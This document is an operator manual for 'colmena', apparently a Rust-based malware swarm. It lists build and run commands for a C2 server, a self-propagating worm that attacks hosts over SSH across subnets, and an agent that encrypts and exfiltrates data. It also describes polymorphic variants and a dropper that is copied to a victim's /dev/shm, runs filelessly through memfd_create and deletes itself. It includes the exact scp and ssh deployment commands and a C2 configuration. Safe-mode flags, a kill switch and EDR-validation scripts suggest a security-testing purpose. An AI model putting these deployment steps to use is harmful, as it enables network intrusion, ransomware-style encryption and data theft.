# Operator Guide

## Prerequisites

- Rust toolchain (`rustup`, `cargo`)
- OpenSSL dev libraries (`libssl-dev`)
- Python 3 (for C2 server and dashboard)
- Linux kernel 3.17+ (for `memfd_create`)

## Environment Setup

```bash
# One-time
source build_env.sh

# Build everything
./colmena.sh build
```

## Operating Modes

### 1. Brain Mode (Safe)

Operator-only. Launches C2 server + dashboard. NO agents. NO attacks.

```bash
./colmena.sh brain
```

- C2 Server: `https://localhost:8443`
- Dashboard: `http://localhost:8080`
- Your IPs are protected via `colmena.toml [brain] safe_ips`

### 2. Colony Mode (Aggressive)

Full swarm deployment. All 6 agents + Worm. Attacks every reachable host except safe IPs.

```bash
# Enable aggressive mode in colmena.toml
# colony.aggressive = true

./colmena.sh colony
```

**What happens:**
1. Scout scans the system, publishes beliefs (OS, user, EDR status, processes)
2. Shaper discovers live hosts via nmap/ARP, attacks each via SSH
3. Worm propagates autonomously to all reachable hosts
4. Hoarder waits for consensus then encrypts/exfiltrates
5. Weaver generates polymorphic variants for each hop

**Duration:** 120 seconds (configurable in `swarm_run/src/main.rs`)

### 3. Deploy Mode

Deploy the dropper to a remote victim via SCP + SSH.

```bash
./colmena.sh deploy 192.168.1.50
```

**Requirements:**
- SSH access to victim (`root` user)
- SSH key already configured

**What happens:**
1. Compiles `dropper` binary
2. SCPs it to `/dev/shm/.d` on victim (RAM disk, no fs write in `/tmp`)
3. SSH exec to make it executable and run
4. Dropper extracts all 6 agents via `memfd_create`, spawns them, self-destructs

### Manual Deployment

```bash
# Compile payloads
cargo build --release --workspace

# Copy to victim
scp payloads/dropper root@192.168.1.50:/dev/shm/.d

# Execute on victim
ssh root@192.168.1.50 "chmod +x /dev/shm/.d && /dev/shm/.d"
```

## Configuration

Edit `colmena.toml`:

```toml
[brain]
safe_ips = ["192.168.1.100"]      # Your IP - NEVER attacked
safe_hostnames = ["operator-pc"]   # Your hostname - NEVER attacked

[colony]
aggressive = true                  # Attack all reachable hosts
scan_subnets = ["192.168.1.0/24"]  # Subnets to scan
max_concurrent_infections = 5      # Parallel SSH attempts
infection_cooldown_secs = 30       # Wait between infections

[c2]
url = "https://your-server:8443/collect"  # C2 endpoint
api_key = "your-secret-key"               # Auth token

[exploits]
safe_mode = true                  # DEFAULT: exploits are inert
enabled = false                   # Enable for real exploitation
operator_approved = false         # Must be explicitly set
```

## Monitoring

```bash
# Dashboard (auto-refresh 3s)
http://localhost:8080

# API
curl http://localhost:8080/api/state

# CLI status
./colmena.sh status

# EDR validation
python3 tests/validate_edr.py --output report.json --html

# EDR gauntlet
bash tests/edr_gauntlet.sh --watch
```

## Killing Everything

```bash
./colmena.sh stop
```

## Emergency Kill Switch

From the dashboard at `http://localhost:8080`, or via API:

```bash
curl -X POST http://localhost:8443/beacon \
  -H "Content-Type: application/json" \
  -d '{"action":"kill_switch"}'
```

All agents terminate gracefully within 5 seconds.
